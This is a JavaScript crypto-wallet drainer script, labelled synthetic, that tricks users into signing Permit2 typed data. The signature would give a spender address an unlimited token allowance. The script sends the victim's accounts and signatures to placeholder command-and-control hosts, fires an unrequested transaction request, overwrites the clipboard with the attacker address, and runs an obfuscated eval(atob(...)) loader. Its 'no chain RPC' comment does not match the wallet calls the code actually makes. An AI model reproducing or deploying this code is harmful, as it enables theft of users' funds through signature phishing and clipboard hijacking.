// Permit2 approval drainer: builds a PermitSingle/PermitBatch typed-data payload,
// requests a signature from the injected wallet, exfiltrates it and rewrites the
// clipboard address. Synthetic; no chain RPC is contacted.
(function () {
  var C2 = 'https://c2.example.test/permit2';
  var MIRROR = 'https://relay.example.net/permit2';
  eval(atob('Y29uc29sZS5sb2coJ1tQRVJNSVQyXSB0eXBlZC1kYXRhIGJ1aWxkZXIgcmVhZHknKTs='));
  var SPENDER = '0x000000000000000000000000000000000000dEaD';
  var TOKEN = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var wallet = typeof window.ethereum === 'object' ? window.ethereum : null;
  console.log('[PERMIT2] wallet', Boolean(wallet));

  function permitPayload(account) {
    return {
      domain: { name: 'Permit2', chainId: 1, verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
      types: {
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      },
      primaryType: 'PermitSingle',
      message: {
        details: { token: TOKEN, amount: '1461501637330902918203684832716283019655932542975', expiration: 4102444800, nonce: 7 },
        spender: SPENDER,
        sigDeadline: Math.floor(Date.now() / 1000) + 3600
      },
      account: account
    };
  }

  function buildBatch(account) {
    return {
      domain: { name: 'Permit2', chainId: 1, verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
      types: {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      },
      primaryType: 'PermitBatch',
      message: {
        details: [
          { token: TOKEN, amount: '1461501637330902918203684832716283019655932542975', expiration: 4102444800, nonce: 7 },
          { token: TOKEN, amount: '1461501637330902918203684832716283019655932542975', expiration: 4102444800, nonce: 8 }
        ],
        spender: SPENDER,
        sigDeadline: Math.floor(Date.now() / 1000) + 7200
      },
      account: account
    };
  }

  function report(kind, data) {
    var packet = { kind: kind, data: data, origin: location.origin, at: Date.now() };
    try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {}); } catch (error) {}
    try { fetch(MIRROR, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {}); } catch (error) {}
    try { localStorage.setItem('permit2:' + kind, JSON.stringify(data)); } catch (error) {}
    console.log('[PERMIT2] reported', kind);
  }

  if (wallet && wallet.request) {
    Promise.resolve(wallet.request({ method: 'eth_requestAccounts' }))
      .then(function (accounts) {
        report('accounts', accounts);
        var typed = permitPayload(accounts[0]);
        var batch = buildBatch(accounts[0]);
        report('typed-data', { primaryType: typed.primaryType, spender: typed.message.spender, batchDetails: batch.message.details.length });
        return wallet.request({ method: 'eth_signTypedData_v4', params: [accounts[0], typed] });
      })
      .then(function (signature) { report('signature', signature); })
      .catch(function (error) { report('rejected', String(error.message)); });
  } else {
    report('no-wallet', { platform: navigator.platform });
  }

  try {
    if (window.ethereum && window.ethereum.request) {
      Promise.resolve(window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: '0x0000000000000000000000000000000000000001', to: TOKEN, data: '0xdeadbeef' }]
      })).catch(function () {});
    }
  } catch (error) {}
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(SPENDER);
  } catch (error) {}
  var attempts = 0;
  var timer = setInterval(function () {
    attempts += 1;
    try {
      fetch(C2 + '/heartbeat?attempt=' + attempts, { method: 'POST', body: btoa(JSON.stringify({ attempts: attempts, spender: SPENDER })) }).catch(function () {});
    } catch (error) {}
    if (attempts >= 2) clearInterval(timer);
  }, 400);
  setTimeout(function () { console.log('[PERMIT2] approval tick', attempts); }, 900);
})();
